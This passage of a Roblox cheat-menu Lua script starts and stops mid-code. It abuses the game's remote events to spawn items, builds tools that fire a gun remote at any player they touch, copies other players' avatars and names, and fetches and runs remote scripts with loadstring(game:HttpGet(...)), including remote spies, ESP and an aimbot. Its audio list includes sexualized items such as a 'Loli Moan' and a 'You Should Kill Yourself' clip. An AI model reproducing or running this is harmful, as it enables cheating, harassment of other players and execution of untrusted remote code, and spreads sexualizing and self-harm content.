    {Name = "Gonna Enjoy?", ID = 116293771329297},
    {Name = "Enjoying", ID = 93462644278510},
    {Name = "Hmmmm", ID = 133135656929513},
    {Name = "Moan 1", ID = 105263704862377},
    {Name = "Moan 2", ID = 92186909873950},
    {Name = "Sus Sex", ID = 128137573022197},
    {Name = "Strange Moan", ID = 131219411501419},
    {Name = "Kawai Moan", ID = 100409245129170},
    {Name = "Hentai Sound", ID = 88332347208779},
    {Name = "Yamete Kudasai", ID = 108494476595033},
    {Name = "Anime Sound", ID = 134640594695384},
    {Name = "Loli Moan", ID = 119277017538197},
    {Name = "Ai Poison", ID = 115870718113313},
    {Name = "Come Here SUS", ID = 77405864184828},
    {Name = "UwU", ID = 76820720070248},
    {Name = "Oh My Butt", ID = 130714479795369},
    {Name = "Girl Audio 2", ID = 84207358477461},
    {Name = "Who's The Manga", ID = 106624090319571},
    {Name = "Oh Alexandre de Moraes", ID = 107261471941570},
    {Name = "Hi Meme", ID = 120006672159037},
    {Name = "Go Go Go", ID = 103262503950995},
    {Name = "Take Jack", ID = 132603645477541},
    {Name = "Take Jack V2", ID = 100446887985203},
    {Name = "Take Jack In Hot Sun", ID = 97476487963273},
    {Name = "Ifood", ID = 133843750864059},
    {Name = "Seems Like She Wants RAM", ID = 94395705857835},
    {Name = "Lula Everyone Go", ID = 136804576009416},
    {Name = "Joker", ID = 84663543883498},
    {Name = "Shopee", ID = 8747441609},
    {Name = "Disgusting", ID = 103440368630269},
    {Name = "Get Out Dishwasher", ID = 101232400175829},
    {Name = "Crazy Doesn't Compensate", ID = 78442476709262},
    {Name = "Look What I Am", ID = 94889439372168},
    {Name = "Today I'll Be Your Woman", ID = 90844637105538},
    {Name = "Lie Down I Told You Sirens", ID = 100291188941582},
    {Name = "Meow", ID = 131804436682424},
    {Name = "Skibidi", ID = 128771670035179},
    {Name = "BIRULEIBI", ID = 121569761604968},
    {Name = "Random Sounds", ID = 133106998846260},
    {Name = "Go Corinthians!", ID = 127012936767471},
    {Name = "My Sigma", ID = 103431815659907},
    {Name = "Mama", ID = 106850066985594},
    {Name = "OH MY GOD", ID = 73349649774476},
    {Name = "Aahh Plankton Meme", ID = 95982351322190},
    {Name = "CHINABOY", ID = 84403553163931},
    {Name = "CHILD PASTOR AND ANGELS TONGUE", ID = 71153532555470},
    {Name = "Get Out Disgrace", ID = 106973692977609},
    {Name = "Hey Hi Everything Good?", ID = 80870678096428},
    {Name = "LOOK AT DANONE'S CAR", ID = 110493863773948},
    {Name = "Nooooo, Nooooo, Nooo!", ID = 95825536480898},
    {Name = "SIRIGUELA FOOT", ID = 112804043442210},
    {Name = "And The Corn Cake Car", ID = 94951629392683},
    {Name = "GOOD MORNING", ID = 136579844511260},
    {Name = "Oh My Gum", ID = 92911732806153},
    {Name = "Can I Call You Or Your Wife...", ID = 103211341252816},
    {Name = "Good Chi Plays Well Man", ID = 110707564387669},
    {Name = "What Meme", ID = 120092799810101},
    {Name = "Very Ugly", ID = 79241074803021},
    {Name = "Lula Where's Ze Gotinha", ID = 86012585992725},
    {Name = "Died", ID = 8872409975},
    {Name = "The Sink Is Full Of Crazy", ID = 98076927129047},
    {Name = "Mahito Kill Song", ID = 128669424001766},
    {Name = "Succumb", ID = 7946300950},
    {Name = "Didn't Even Click Thurzin", ID = 84428355313544},
    {Name = "Phew LOOK MESSAGE", ID = 121668429878811},
    {Name = "Takeee", ID = 128319664118768},
    {Name = "Thief's Laugh", ID = 133065882609605},
    {Name = "And The PIX Still Nothing", ID = 113831443375212},
    {Name = "I'm Going Nothing", ID = 89093085290586},
    {Name = "Eli Likes", ID = 105012436535315},
    {Name = "A Three-Legged Horse?", ID = 8164241439},
    {Name = "You Are A Bunch Of SOB", ID = 8232773326},
    {Name = "HAHA TROLLED YOU TOO", ID = 7021794555},
    {Name = "Shut Up Kenga", ID = 86494561679259},
    {Name = "Alvin Cut", ID = 88788640194373},
    {Name = "And How Does The Laugh Go?", ID = 140713372459057},
    {Name = "You Should Kill Yourself", ID = 100227426848009},
    {Name = "Receive", ID = 94142662616215},
    {Name = "UUIIII", ID = 73210569653520},
    {Name = "Get Out", ID = 121169949217007},
    {Name = "Good Laugh Too Much", ID = 127589011971759},
    {Name = "Stumble Wooden Leg", ID = 106809680656199},
    {Name = "Gomo Gomo No!", ID = 137067472449625},
    {Name = "Burp", ID = 140203378050178},
    {Name = "Will Go", ID = 136752451575091},
    {Name = "Don't Think You're Too Much", ID = 101588606280167},
    {Name = "WhatsApp Notification V1", ID = 107004225739474},
    {Name = "WhatsApp Notification V2", ID = 18850631582},
    {Name = "Samsung V1", ID = 123767635061073},
    {Name = "Samsung V2", ID = 96579234730244},
    {Name = "Shiii", ID = 120566727202986},
    {Name = "Ai Take Miku", ID = 139770074770361},
    {Name = "Miku Miku", ID = 72812231495047},
    {Name = "Kuru Kuru", ID = 122465710753374},
    {Name = "PM ROCAM", ID = 96161547081609},
    {Name = "Horse!", ID = 78871573440184},
    {Name = "Let The Boys Play", ID = 80291355054807},
    {Name = "Flamengo", ID = 137774355552052},
    {Name = "Get Out Of The Way Satan", ID = 127944706557246},
    {Name = "For Real Now It's Time", ID = 120677947987369},
    {Name = "Can't Kick Me Cause Your Brain Is Dumb", ID = 82284055473737},
    {Name = "You're Screwed I'll Get You", ID = 120214772725166},
    {Name = "Deley", ID = 102906880476838},
    {Name = "You Are A Beta", ID = 130233956349541},
    {Name = "Please Don't Take Me Out", ID = 85321374020324},
    {Name = "Hello Beauty Can You Give Me Many", ID = 74235334504693},
    {Name = "Discord Sus", ID = 122662798976905},
    {Name = "Firework Whistle", ID = 6549021381},
    {Name = "Off", ID = 1778829098},
    {Name = "Kazuma Kazuma", ID = 127954653962405},
    {Name = "Something Blown", ID = 123592956882621},
    {Name = "Blown Space", ID = 136179020015211},
    {Name = "Alaku Good", ID = 110796593805268},
    {Name = "Bus", ID = 139841197791567},
    {Name = "Blown With", ID = 137478052262430},
    {Name = "Don't Know", ID = 116672405522828},
    {Name = "HA HA HA", ID = 138236682866721}
}

local audioNames = {}
for _, audio in ipairs(audios) do
    table.insert(audioNames, audio.Name)
end

Tab:AddDropdown({
    Name = "Select Audio",
    Description = "Choose an audio from the list",
    Options = audioNames,
    Default = audioNames[1],
    Flag = "selected_audio",
    Callback = function(value)
        for _, audio in ipairs(audios) do
            if audio.Name == value then
                selectedAudioID = audio.ID
                break
            end
        end
    end
})

local audioLoop = false

Tab:AddSection({"„ÄãLOOP"})

local function playLoopedAudio()
    while audioLoop do
        if selectedAudioID then
            local args = {
                [1] = game:GetService("Workspace"),
                [2] = selectedAudioID,
                [3] = 1,
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))

            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://" .. selectedAudioID
            sound.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
            sound:Play()
        end

        task.wait(0.5)
    end
end

local function playAudio()
    local args = { workspace, selectedAudioID, 1 }
    for i = 1, 5 do
        if RE:FindFirstChild("1Gu1nSound1s") then
            RE["1Gu1nSound1s"]:FireServer(unpack(args))
        end
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. tostring(selectedAudioID)
        sound.Parent = RootPart
        sound:Play()
        task.wait(1.5)
        sound:Destroy()
    end
end

Tab:AddToggle({
    Name = "Loop Play Audio",
    Description = "Enables audio loop",
    Default = false,
    Flag = "audio_loop",
    Callback = function(value)
        audioLoop = value
        if audioLoop then
            task.spawn(playLoopedAudio)
        end
    end
})


local Tab = Window:MakeTab({"Tools ", "backpack"})


local KeyCardsSection = Tab:AddSection({"Key Cards"})

Button = Tab:AddButton({
  Name = "Give Key Card energetic",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "PowerKeyCard"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab:AddButton({
  Name = "Give Key Card Dark Green ",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "KeyCardDarkGreen"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab:AddButton({
  Name = "Give Key Card White",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "KeyCardWhite"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

local KeysSection = Tab:AddSection({"keys"})

Button = Tab:AddButton({
  Name = "Give Key Card Old",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "OldKey"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab:AddButton({
  Name = "Give Key Card Black Bank",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "BankGateKey"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})


local WeaponsSection = Tab:AddSection({"Guns"})

Button = Tab:AddButton({
  Name = "Give Good Sword",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "SwordGold"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

local EquipmentSection = Tab:AddSection({"equipments"})

Button = Tab:AddButton({
  Name = "Give fire hose",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "FireHose"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

local BooksSection = Tab:AddSection({"Books"})

Button = Tab:AddButton({
  Name = "Give secret book",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "AgencyBook"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

local ValuablesSection = Tab:AddSection({"valuable tool"})

Button = Tab:AddButton({
  Name = "Give diamonds",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "DuffleBagDiamonds"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})


Tab:AddSection({"Special tools"})


Tab:AddButton({
    Name = "Sword Goner",
    Callback = function()
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Shadow6698/swordbug/refs/heads/main/Main.txt"))()
        end)
        if success then
            TeleportCarro:MostrarNotificacao("‚úÖ Espada Bugadora carregada!")
        else
            TeleportCarro:MostrarNotificacao("‚ùå Erro ao carregar: " .. tostring(err))
        end
    end
})


Tab:AddButton({
    "Dark sword",
    function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local LocalPlayer = player
        local RE = ReplicatedStorage:WaitForChild("RE")
        local ClearEvent = RE:FindFirstChild("1Clea1rTool1s")
        local ToolEvent = RE:FindFirstChild("1Too1l")
        local FireEvent = RE:FindFirstChild("1Gu1n")
        
        local function clearAllTools()
            if ClearEvent then
                ClearEvent:FireServer("ClearAllTools")
            end
        end
        
        local function getAssault()
            if ToolEvent then
                ToolEvent:InvokeServer("PickingTools", "Assault")
            end
        end
        
        local function hasAssault()
            return LocalPlayer.Backpack:FindFirstChild("Assault") ~= nil
        end
        
        local function fireAtPart(targetPart)
            local gunScript = LocalPlayer.Backpack:FindFirstChild("Assault")
                and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local")
        
            if not gunScript or not targetPart then return end
        
            local args = {
                targetPart,
                targetPart,
                Vector3.new(9e16, 9e16, 9e16),
                targetPart.Position,
                gunScript:FindFirstChild("MuzzleEffect"),
                gunScript:FindFirstChild("HitEffect"),
                0,
                0,
                { false },
                {
                    25,
                    Vector3.new(1000, 1000, 1000),
                    BrickColor.new(29),
                    0.25,
                    Enum.Material.SmoothPlastic,
                    0.25
                },
                true,
                false
            }
        
            FireEvent:FireServer(unpack(args))
        end
        
        local tool = Instance.new("Tool")
        tool.Name = "Glitch Sword"
        tool.RequiresHandle = true
        tool.CanBeDropped = true

        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(1, 5, 1)
        handle.Color = Color3.fromRGB(50, 50, 50)
        handle.Anchored = false
        handle.CanCollide = false
        handle.Transparency = 1
        handle.Parent = tool
        
        tool.Parent = player.Backpack

        local swingAnim = Instance.new("Animation")
        swingAnim.AnimationId = "rbxassetid://522635514"
        local swingCooldown = 0.8
        local lastSwing = 0

        local touchCooldown = {}
        handle.Touched:Connect(function(hit)
            local otherChar = hit.Parent
            local otherHum = otherChar and otherChar:FindFirstChildOfClass("Humanoid")
            local otherPlayer = otherChar and Players:GetPlayerFromCharacter(otherChar)
        
            if otherPlayer and otherPlayer ~= LocalPlayer and otherHum and otherHum.Health > 0 then
                if not touchCooldown[otherPlayer] or tick() - touchCooldown[otherPlayer] > 0.5 then
                    touchCooldown[otherPlayer] = tick()
        
                    if not hasAssault() then
                        getAssault()
                        task.wait(0.03)
                    end
        
                    local root = otherChar:FindFirstChild("HumanoidRootPart")
                    if root then
                        fireAtPart(root)
                    end
                end
            end
        end)
        
        local equippedItem = false
        local clickCooldown = 0.8
        local lastClick = 0

        tool.Equipped:Connect(function(mouse)
            local char = tool.Parent
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        
                local args = {12866137394}
                ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))

                equippedItem = true

                mouse.Button1Down:Connect(function()
                    if not equippedItem then return end
                    if tick() - lastClick < clickCooldown then return end
                    lastClick = tick()

                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        local anim = Instance.new("Animation")
                        anim.AnimationId = "rbxassetid://2410679501"
                        local track = animator:LoadAnimation(anim)
                        track:Play()
                    end
                end)
            end
        end)

        tool.Unequipped:Connect(function()
            equippedItem = false
            if tool.Handle then
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ResetCharacterAppearance"):FireServer()
            end
        end)
    end
})

Tab:AddButton({
    "Bug hammer",
    function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local LocalPlayer = player
        local RE = ReplicatedStorage:WaitForChild("RE")
        local ClearEvent = RE:FindFirstChild("1Clea1rTool1s")
        local ToolEvent = RE:FindFirstChild("1Too1l")
        local FireEvent = RE:FindFirstChild("1Gu1n")
        
        local function clearAllTools()
            if ClearEvent then
                ClearEvent:FireServer("ClearAllTools")
            end
        end
        
        local function getAssault()
            if ToolEvent then
                ToolEvent:InvokeServer("PickingTools", "Assault")
            end
        end
        
        local function hasAssault()
            return LocalPlayer.Backpack:FindFirstChild("Assault") ~= nil
        end
        
        local function fireAtPart(targetPart)
            local gunScript = LocalPlayer.Backpack:FindFirstChild("Assault")
                and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local")
        
            if not gunScript or not targetPart then return end
        
            local args = {
                targetPart,
                targetPart,
                Vector3.new(9e16, 9e16, 9e16),
                targetPart.Position,
                gunScript:FindFirstChild("MuzzleEffect"),
                gunScript:FindFirstChild("HitEffect"),
                0,
                0,
                { false },
                {
                    25,
                    Vector3.new(1000, 1000, 1000),
                    BrickColor.new(29),
                    0.25,
                    Enum.Material.SmoothPlastic,
                    0.25
                },
                true,
                false
            }
        
            FireEvent:FireServer(unpack(args))
        end
        
        local tool = Instance.new("Tool")
        tool.Name = "Bug Hammer"
        tool.RequiresHandle = true
        tool.CanBeDropped = true

        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(1, 5, 1)
        handle.Color = Color3.fromRGB(50, 50, 50)
        handle.Anchored = false
        handle.CanCollide = false
        handle.Transparency = 1
        handle.Parent = tool
        
        tool.Parent = player.Backpack

        local swingAnim = Instance.new("Animation")
        swingAnim.AnimationId = "rbxassetid://522635514"
        local swingCooldown = 0.8
        local lastSwing = 0

        local touchCooldown = {}
        handle.Touched:Connect(function(hit)
            local otherChar = hit.Parent
            local otherHum = otherChar and otherChar:FindFirstChildOfClass("Humanoid")
            local otherPlayer = otherChar and Players:GetPlayerFromCharacter(otherChar)
        
            if otherPlayer and otherPlayer ~= LocalPlayer and otherHum and otherHum.Health > 0 then
                if not touchCooldown[otherPlayer] or tick() - touchCooldown[otherPlayer] > 0.5 then
                    touchCooldown[otherPlayer] = tick()
        
                    if not hasAssault() then
                        getAssault()
                        task.wait(0.03)
                    end
        
                    local root = otherChar:FindFirstChild("HumanoidRootPart")
                    if root then
                        fireAtPart(root)
                    end
                end
            end
        end)
        
        local equippedItem = false
        local clickCooldown = 0.8
        local lastClick = 0

        tool.Equipped:Connect(function(mouse)
            local char = tool.Parent
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        
                local args = {17615158624}
                ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))

                equippedItem = true

                mouse.Button1Down:Connect(function()
                    if not equippedItem then return end
                    if tick() - lastClick < clickCooldown then return end
                    lastClick = tick()

                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        local anim = Instance.new("Animation")
                        anim.AnimationId = "rbxassetid://2410679501"
                        local track = animator:LoadAnimation(anim)
                        track:Play()
                    end
                end)
            end
        end)

        tool.Unequipped:Connect(function()
            equippedItem = false
            if tool.Handle then
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ResetCharacterAppearance"):FireServer()
            end
        end)
    end
})


local Tab = Window:MakeTab({"Avatar ", "users"})


local Section = Tab:AddSection({"Copy Outfit"})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local Target = nil

local function GetPlayerNames()
    local PlayerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(PlayerNames, player.Name)
    end
    return PlayerNames
end

local Dropdown = Tab:AddDropdown({
    Name = "Select player",
    Options = GetPlayerNames(),
    Default = Target,
    Callback = function(Value)
        Target = Value
    end
})

local function UpdateDropdown()
    Dropdown:Refresh(GetPlayerNames(), true)
end

Players.PlayerAdded:Connect(UpdateDropdown)
Players.PlayerRemoving:Connect(UpdateDropdown)

Tab:AddButton({
    Name = "Copy Avatar",
    Callback = function()
        if not Target then return end

        local LP = Players.LocalPlayer
        local LChar = LP.Character
        local TPlayer = Players:FindFirstChild(Target)

        if TPlayer and TPlayer.Character then
            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")

            if LHumanoid and THumanoid then
                
                local LDesc = LHumanoid:GetAppliedDescription()

                
                for _, acc in ipairs(LDesc:GetAccessories(true)) do
                    if acc.AssetId and tonumber(acc.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                        task.wait(0.2)
                    end
                end

                if tonumber(LDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                    task.wait(0.2)
                end

                if tonumber(LDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                    task.wait(0.2)
                end

                if tonumber(LDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                    task.wait(0.2)
                end

                local PDesc = THumanoid:GetAppliedDescription()

                
                local argsBody = {
                    [1] = {
                        [1] = PDesc.Torso,
                        [2] = PDesc.RightArm,
                        [3] = PDesc.LeftArm,
                        [4] = PDesc.RightLeg,
                        [5] = PDesc.LeftLeg,
                        [6] = PDesc.Head
                    }
                }
                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
                task.wait(0.5)

                if tonumber(PDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                    task.wait(0.3)
                end

                if tonumber(PDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                    task.wait(0.3)
                end

                if tonumber(PDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                    task.wait(0.3)
                end

                for _, v in ipairs(PDesc:GetAccessories(true)) do
                    if v.AssetId and tonumber(v.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                        task.wait(0.3)
                    end
                end

                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
                if SkinColor then
                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                    task.wait(0.3)
                end

                if tonumber(PDesc.IdleAnimation) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                    task.wait(0.3)
                end

                
                local Bag = TPlayer:FindFirstChild("PlayersBag")
                if Bag then
                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPNameColor") then
                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBioColor") then
                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                        task.wait(0.3)
                    end
                end
            end
        end
    end
})

local Section = Tab:AddSection({"Character Appearance"})

local isActive = false

Tab:AddToggle({
    Name = "Loop Smoke Avatar",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local mall = workspace:WaitForChild("WorkspaceCom"):WaitForChild("001_Mall"):WaitForChild("001_Pizza"):FindFirstChild("CatchFire")
            
            if mall then
                local touchInterest = mall:FindFirstChild("TouchInterest")
                if touchInterest then
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 0)
                    wait()
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 1)
                end
            end
            wait(1)
        end
    end
})

Tab:AddToggle({
    Name = "Loop Fire Avatar",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local playerName = game.Players.LocalPlayer.Name
            local lotFolder = game:GetService("Workspace"):WaitForChild("001_Lots")
            local house = lotFolder:FindFirstChild(playerName .. "House")

            if house then
                local mall = house:WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):WaitForChild("001_BBQ"):FindFirstChild("CatchFire")
                if mall then
                    local touchInterest = mall:FindFirstChild("TouchInterest")
                    if touchInterest then
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 0)
                        wait()
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 1)
                    end
                end
            else
                warn("House not found for player: " .. playerName)
            end
            wait(1)
        end
    end
})



local Section = Tab:AddSection({"Nick RGB"})

local vibrantColors = {
    Color3.new(1, 0, 0),
    Color3.new(0, 1, 0),
    Color3.new(0, 0, 1),
    Color3.new(1, 1, 0),
    Color3.new(1, 0, 1),
    Color3.new(0, 1, 1),
    Color3.new(1, 0.5, 0),
    Color3.new(0.5, 0, 1)
}

local function fireServer(eventName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local event = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild(eventName)
    if event then
        pcall(function()
            event:FireServer(unpack(args))
        end)
    end
end

local nameAndBioRGBActive = false
Tab:AddToggle({
    Name = "Nome e Bio RGB Sincronizado",
    Description = "Ativa cores RGB sincronizadas para Nome e Bio",
    Default = false,
    Callback = function(state)
        nameAndBioRGBActive = state
        if state then
            task.spawn(function()
                while nameAndBioRGBActive and LocalPlayer.Character do
                    local color = vibrantColors[math.random(1, #vibrantColors)]
                    local nameArgs = { [1] = "PickingRPNameColor", [2] = color }
                    local bioArgs = { [1] = "PickingRPBioColor", [2] = color }
                    fireServer("1RPNam1eColo1r", nameArgs)
                    fireServer("1RPNam1eColo1r", bioArgs)
                    task.wait(1)
                end
            end)
        end
    end
})

local nameRGBActive = false
Tab:AddToggle({
    Name = "Nome RGB",
    Description = "Ativa cores RGB para o Nome",
    Default = false,
    Callback = function(state)
        nameRGBActive = state
        if state then
            task.spawn(function()
                while nameRGBActive and LocalPlayer.Character do
                    local color = vibrantColors[math.random(1, #vibrantColors)]
                    local args = { [1] = "PickingRPNameColor", [2] = color }
                    fireServer("1RPNam1eColo1r", args)
                    task.wait(1)
                end
            end)
        end
    end
})

local bioRGBActive = false
Tab:AddToggle({
    Name = "Bio RGB",
    Description = "Ativa cores RGB aleat√≥rias na sua bio",
    Default = false,
    Callback = function(state)
        bioRGBActive = state
        if state then
            task.spawn(function()
                while bioRGBActive and LocalPlayer.Character do
                    local color = vibrantColors[math.random(1, #vibrantColors)]
                    local args = { [1] = "PickingRPBioColor", [2] = color }
                    fireServer("1RPNam1eColo1r", args)
                    task.wait(1)
                end
            end)
        end
    end
})


local Tab = Window:MakeTab({"Scripts", "book"})


Tab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
})


Tab:AddButton({
    Name = "Dex Explorer",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/dex.lua'))()
    end
})


Tab:AddButton({
    Name = "Remote Spy",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua'))()
    end
})


Tab:AddButton({
    Name = "System Broken",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script'))()
    end
})


Tab:AddButton({
    Name = "Domain X",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
    end
})


Tab:AddButton({
    Name = "Hydroxide",
    Callback = function()
        local owner = "Upbolt"
        local branch = "revision"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/" .. owner .. "/Hydroxide/" .. branch .. "/init.lua", true))()
    end
})


Tab:AddButton({
    Name = "Universal ESP",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))()
    end
})


Tab:AddButton({
    Name = "CMD-X",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
    end
})


Tab:AddButton({
    Name = "Orca",
    Callback = function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
    end
})


Tab:AddButton({
    Name = "Vynixius",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua'))()
    end
})


Tab:AddButton({
    Name = "Dark Dex",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua'))()
    end
})


Tab:AddButton({
    Name = "Script-Ware",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptWare/ScriptWare/main/loader.lua'))()
    end
})


Tab:AddButton({
    Name = "Owl Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt'))()
    end
})


Tab:AddButton({
    Name = "Universal Aimbot",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua'))()
    end
})


Tab:AddButton({
    Name = "Unnamed ESP V2",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))()
    end
})


local Tab = Window:MakeTab({"Ants Fuctions", "shield"})


local LocalPlayer = game:GetService("Players").LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")


local function moveToBackup(obj, backupTable)
    table.insert(backupTable, { object = obj, originalParent = obj.Parent })
    obj.Parent = nil 
end

local function restoreFromBackup(backupTable)
    for _, data in ipairs(backupTable) do
        if data.object and data.originalParent then
            data.object.Parent = data.originalParent
        end
    end
    table.clear(backupTable)
end

local removedVehicles, removedCanoes, removedJets, removedHelis, removedBalls = {}, {}, {}, {}, {}
local antiVehicleConnection, antiCanoeConnection, antiJetConnection, antiHeliConnection, antiBallConnection, antiSitConnection


Tab:AddToggle({
    Name = "Ant Fling Ve√≠culos",
    Default = false,
    Callback = function(state)
        if state then
            antiVehicleConnection = RunService.Heartbeat:Connect(function()
                local vehiclesFolder = Workspace:FindFirstChild("Vehicles")
                if vehiclesFolder then
